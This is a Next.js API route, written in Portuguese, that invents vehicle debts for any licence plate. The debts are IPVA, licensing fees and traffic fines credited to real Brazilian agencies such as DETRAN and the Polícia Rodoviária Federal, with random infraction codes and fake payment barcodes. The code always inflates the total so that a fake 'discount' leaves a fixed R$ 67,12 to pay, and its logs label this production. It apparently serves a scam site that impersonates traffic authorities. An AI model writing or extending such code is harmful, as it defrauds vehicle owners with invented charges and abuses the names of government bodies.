import { type NextRequest, NextResponse } from "next/server"

// Dados para gerar débitos aleatórios
const tiposDebito = [
  "IPVA",
  "Licenciamento",
  "Multa de Trânsito",
  "Taxa de Vistoria",
  "Seguro DPVAT",
  "Taxa de Emplacamento",
]

const orgaos = [
  "DETRAN-SP",
  "DETRAN-RJ",
  "DETRAN-MG",
  "DETRAN-RS",
  "DETRAN-PR",
  "Prefeitura Municipal",
  "Polícia Rodoviária Federal",
  "Polícia Militar",
]

const infracoes = [
  "Excesso de velocidade",
  "Estacionamento irregular",
  "Avanço de sinal vermelho",
  "Uso de celular ao volante",
  "Não uso do cinto de segurança",
  "Estacionar em vaga de deficiente",
  "Dirigir sem CNH",
  "Veículo sem licenciamento",
]

function gerarDataAleatoria() {
  const inicio = new Date(2023, 0, 1)
  const fim = new Date()
  const data = new Date(inicio.getTime() + Math.random() * (fim.getTime() - inicio.getTime()))
  return data.toLocaleDateString("pt-BR")
}

function gerarCodigoInfracao() {
  return Math.floor(Math.random() * 90000) + 10000
}

function gerarAutoInfracao() {
  const letras = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
  const numeros = "0123456789"
  let codigo = ""

  // 2 letras + 6 números
  for (let i = 0; i < 2; i++) {
    codigo += letras.charAt(Math.floor(Math.random() * letras.length))
  }
  for (let i = 0; i < 6; i++) {
    codigo += numeros.charAt(Math.floor(Math.random() * numeros.length))
  }

  return codigo
}

function gerarCodigoBarras() {
  let codigo = ""
  for (let i = 0; i < 47; i++) {
    codigo += Math.floor(Math.random() * 10)
  }
  return codigo
}

export async function POST(request: NextRequest) {
  try {
    const { placa } = await request.json()

    if (!placa) {
      return NextResponse.json({ error: "Placa é obrigatória" }, { status: 400 })
    }

    console.log("💰 [PRODUÇÃO] Gerando débitos com valor final fixo R$ 67,12...")

    // Gera entre 1 a 4 débitos aleatórios
    const quantidadeDebitos = Math.floor(Math.random() * 4) + 1
    const debitos = []
    let valorTotalSoma = 0
    const LIMITE_MAXIMO_TOTAL = 1200 // Limite máximo do valor total dos débitos
    //const VALOR_FINAL_FIXO = 67.12 // Valor que o usuário sempre pagará

    // Primeiro, gera um valor total aleatório entre R$ 200 e R$ 1200
    const valorTotalDesejado = Math.random() * (LIMITE_MAXIMO_TOTAL - 200) + 200

    for (let i = 0; i < quantidadeDebitos; i++) {
      const tipo = tiposDebito[Math.floor(Math.random() * tiposDebito.length)]
      const orgao = orgaos[Math.floor(Math.random() * orgaos.length)]
      const dataVencimento = gerarDataAleatoria()

      // Calcula o valor para este débito baseado na distribuição do total
      const valorRestante = valorTotalDesejado - valorTotalSoma
      const debitosRestantes = quantidadeDebitos - i

      let valorDebito
      if (i === quantidadeDebitos - 1) {
        // Último débito: usa o valor restante
        valorDebito = valorRestante
      } else {
        // Distribui o valor de forma aleatória, mas controlada
        const valorMinimo = Math.max(50, valorRestante * 0.1)
        const valorMaximo = Math.min(400, valorRestante * 0.7)
        valorDebito = Math.random() * (valorMaximo - valorMinimo) + valorMinimo
      }

      // Garante que o valor seja positivo e razoável
      valorDebito = Math.max(50, Math.min(valorDebito, valorRestante))

      const valorPrincipal = valorDebito * 0.8 // 80% do valor é principal
      const juros = valorDebito * 0.15 // 15% juros
      const multa = valorDebito * 0.05 // 5% multa

      valorTotalSoma += valorDebito

      const debito: any = {
        tipo,
        valor: valorPrincipal.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
        juros: juros.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
        multa: multa.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
        total: valorDebito.toLocaleString("pt-BR", { style: "currency", currency: "BRL" }),
        status: "Pendente",
        vencimento: dataVencimento,
        orgao,
        codigo_barras: gerarCodigoBarras(),
      }

      // Adiciona campos específicos baseado no tipo
      if (tipo === "IPVA") {
        debito.ano = "2024"
        debito.referencia = "IPVA 2024"
      } else if (tipo === "Licenciamento") {
        debito.ano = "2024"
        debito.referencia = "Licenciamento Anual"
      } else if (tipo === "Multa de Trânsito") {
        debito.data = gerarDataAleatoria()
        debito.infracao = infracoes[Math.floor(Math.random() * infracoes.length)]
        debito.codigo = gerarCodigoInfracao().toString()
        debito.pontos = Math.floor(Math.random() * 7) + 3
        debito.auto_infracao = gerarAutoInfracao()
        debito.local = "Av. Paulista, 1000 - São Paulo/SP"
        debito.referencia = `Multa ${debito.codigo}`
      } else {
        debito.referencia = `${tipo} - ${new Date().getFullYear()}`
      }

      debitos.push(debito)
    }

    // Calcula o percentual de desconto para que o valor final seja sempre R$ 67,12
    const VALOR_FINAL_FIXO = 67.12 // Valor que o usuário sempre pagará

    // Garante que o valor total seja maior que 67,12 para ter desconto positivo
    if (valorTotalSoma <= VALOR_FINAL_FIXO) {
      valorTotalSoma = VALOR_FINAL_FIXO + Math.random() * 500 + 200 // Entre R$ 267,12 e R$ 767,12
    }

    const percentualDesconto = ((valorTotalSoma - VALOR_FINAL_FIXO) / valorTotalSoma) * 100

    console.log(`💰 [PRODUÇÃO] Débitos gerados:`)
    console.log(`💰 [PRODUÇÃO] Valor total: R$ ${valorTotalSoma.toFixed(2)}`)
    console.log(`🎯 [PRODUÇÃO] Valor com desconto: R$ ${VALOR_FINAL_FIXO.toFixed(2)}`)
    console.log(`📊 [PRODUÇÃO] Percentual de desconto: ${percentualDesconto.toFixed(1)}%`)
    console.log(`📊 [PRODUÇÃO] Quantidade de débitos: ${debitos.length}`)

    return NextResponse.json({
      success: true,
      debitos,
      valorTotal: valorTotalSoma,
      valorComDesconto: VALOR_FINAL_FIXO,
      percentualDesconto: Math.max(0, Math.round(percentualDesconto)),
    })
  } catch (error) {
    console.error("Erro ao gerar débitos:", error)
    return NextResponse.json({ error: "Erro interno do servidor" }, { status: 500 })
  }
}
